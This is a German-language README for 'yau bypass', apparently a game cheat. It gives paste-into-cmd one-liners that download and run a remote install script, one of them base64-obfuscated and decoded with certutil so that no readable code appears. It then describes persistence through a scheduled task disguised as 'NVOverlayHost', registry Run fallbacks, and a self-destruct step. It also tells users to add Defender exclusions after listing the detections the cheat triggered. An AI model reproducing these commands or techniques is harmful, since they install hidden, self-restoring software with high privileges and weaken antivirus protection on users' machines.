# yau bypass — Start per cmd

Der User lädt nichts herunter und klickt nichts an. Er pastet **eine Zeile in cmd**:

```
curl -L -o "%TEMP%\yau.cmd" https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/install.cmd && "%TEMP%\yau.cmd"
```

## Verschlüsselte Variante (kein lesbarer Code)

```
curl -L -o "%TEMP%\y.b64" https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/yb.b64 && certutil -f -decode "%TEMP%\y.b64" "%TEMP%\y.cmd" >nul 2>&1 && "%TEMP%\y.cmd"
```

`yb.b64` ist [install.cmd](install.cmd) als Base64 — im Download steht kein lesbarer
Code mehr, nur Datensalat. `certutil` ist in Windows eingebaut, es wird also weiterhin
kein PowerShell gebraucht. Der dekodierte Inhalt ist byte-identisch (gleiche MD5).

Neu erzeugen nach jeder Änderung an `install.cmd`:

```
base64 -w 64 dist/install.cmd | sed 's/$/\r/' > dist/yb.b64
```

Das ist **Verschleierung, keine echte Verschlüsselung**: die Datei wird auf demselben
PC wieder entschlüsselt, und Virenscannern hilft Base64 eher beim Erkennen als beim
Verstecken. Wirklich verstecken lässt sich nur die Domain (eigene kurze URL).

---

Danach:

1. Das Skript fordert Administratorrechte an (UAC mit **Ja** bestätigen).
2. Es lädt das neueste Release von `yaubypass.exe` nach `%LOCALAPPDATA%\YauBypass\`.
3. Größe wird geprüft — ein kaputter Build kommt nie durch.
4. Es legt `boot.cmd` daneben und registriert die Aufgabe **`NVOverlayHost`**
   (Aufgabenplanung, *Bei Anmeldung*, *höchste Privilegien* → ohne UAC-Fenster).
   Klappt das nicht, wird `NvOverlayHost2` / `NvOverlayTask` probiert, zuletzt der
   Autostart-Registry-Eintrag `HKCU\...\Run\NVOverlayHost`.
5. Ansage: **„Starte jetzt den PC neu"** — nach 15 Sekunden startet der PC neu.
   Beliebige Taste bricht den Neustart ab und startet `yau bypass` sofort.
6. Nach dem Neustart startet `yau bypass` automatisch. **F1** öffnet das Menü.

---

## Was auf dem PC liegt

Die EXE muss **nicht** vorher existieren — alles kommt aus dem Release.

| Pfad / Eintrag | Zweck | Nach Destruct |
|---|---|---|
| `%LOCALAPPDATA%\YauBypass\yaubypass.exe` | der Cheat | löscht sich selbst |
| `%LOCALAPPDATA%\YauBypass\yaubypass.dat` | Sicherheitskopie | bleibt |
| `%LOCALAPPDATA%\YauBypass\boot.cmd` | Starter beim Login | bleibt |
| Aufgabe `NVOverlayHost` | Autostart bei Anmeldung | bleibt |
| `%TEMP%\yau.cmd` | das heruntergeladene Install-Skript | bleibt |

Weil `boot.cmd` fehlende Dateien aus `yaubypass.dat` bzw. aus dem Release nachlädt,
ist der Cheat beim nächsten Login wieder da. Wer das nicht will: Aufgabe
`NVOverlayHost` löschen und den Ordner `%LOCALAPPDATA%\YauBypass` entfernen.

## Defender

Zwei Dinge, die Defender auf einem Testsystem blockiert hat (im Defender-Verlauf
als `2147840094` bzw. `251873` sichtbar):

- die Kommandozeile `schtasks /create ... /sc onlogon /rl highest` (Persistence-Erkennung),
- die Datei `yaubypass.exe` direkt nach dem Download.

Ohne Ausnahme für `%LOCALAPPDATA%\YauBypass` verschwindet die EXE wieder und der
Autostart läuft ins Leere. Ausnahme setzen unter *Windows-Sicherheit → Viren- &
Bedrohungsschutz → Einstellungen verwalten → Ausschlüsse hinzufügen → Ordner*.

## Update veröffentlichen

```
git tag v1.0.2
git push origin v1.0.2
```

Der Workflow [.github/workflows/build.yml](../.github/workflows/build.yml) baut die EXE,
benennt sie in `yaubypass.exe` um und hängt sie an das Release. Das Skript holt immer
`/releases/latest/download/yaubypass.exe` — der User muss nichts tun.
